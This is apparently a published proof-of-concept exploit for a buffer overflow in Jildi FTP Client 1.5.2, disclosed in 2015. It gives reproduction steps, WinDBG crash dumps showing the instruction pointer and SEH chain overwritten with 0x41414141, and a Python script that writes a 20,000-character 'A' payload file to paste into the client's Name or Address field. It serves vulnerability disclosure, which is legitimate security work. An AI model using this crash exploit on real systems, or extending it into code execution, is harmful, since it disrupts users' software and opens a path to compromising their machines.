#!/usr/bin/python
#Exploit Title:Jildi FTP Client Buffer Overflow Poc
#Version:1.5.2 Build 1138
#Homepage:http://de.download.cnet.com/Jildi-FTP-Client/3000-2160_4-10562942.html
#Software Link:http://de.download.cnet.com/Jildi-FTP-Client/3001-2160_4-10562942.html?hasJs=n&hlndr=1&dlm=0
#Tested on:Win7 32bit EN-Ultimate
#Date found:     02.06.2015
#Date published: 02.06.2015
#Author:metacom

'''
===========
Description:
===========
JilidFTP is a powerful ftp-client program for Windows, it fast and reliable
and with lots of useful features. It supports multi-thread file upload or 
download , so you can upload or download several files at the same time. 
The job manager integrates with the Windows scheduler engine ,this provide
you more freedom and flexibility to upload or download your files. 
It can also traces changes within a local directory and apply these 
changes to remote ftp server .The user-friendly interface lets your 
software distribution, uploading files to a web-server, and providing
archives for various purposes more easily.

============
How to Crash:
============ 
Copy the AAAA...string from Jildi_FTP.txt to clipboard, open Jildi Ftp and press Connect
and paste it in the Option -- Name or Address --and press connect.

===============================================
Crash Analysis using WinDBG: Option --> Address
===============================================
(f6c.4fc): Access violation - code c0000005 (!!! second chance !!!)
eax=00000000 ebx=00000000 ecx=41414141 edx=7790660d esi=00000000 edi=00000000
eip=41414141 esp=000311cc ebp=000311ec iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
41414141 ??  
0:000> !exchain
0012ef40: 41414141
Invalid exception stack at 41414141

============================================
Crash Analysis using WinDBG: Option --> Name
============================================
(2ec.dac): Access violation - code c0000005 (!!! second chance !!!)
eax=00000000 ebx=00000000 ecx=41414141 edx=7790660d esi=00000000 edi=00000000
eip=41414141 esp=000311cc ebp=000311ec iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
41414141 ??              ???
0:000> !exchain
0012ef40: 41414141
Invalid exception stack at 41414141
'''
filename="Jildi_FTP.txt"
junk1="\x41" * 20000
buffer=junk1 
textfile = open(filename , 'w')
textfile.write(buffer)
textfile.close()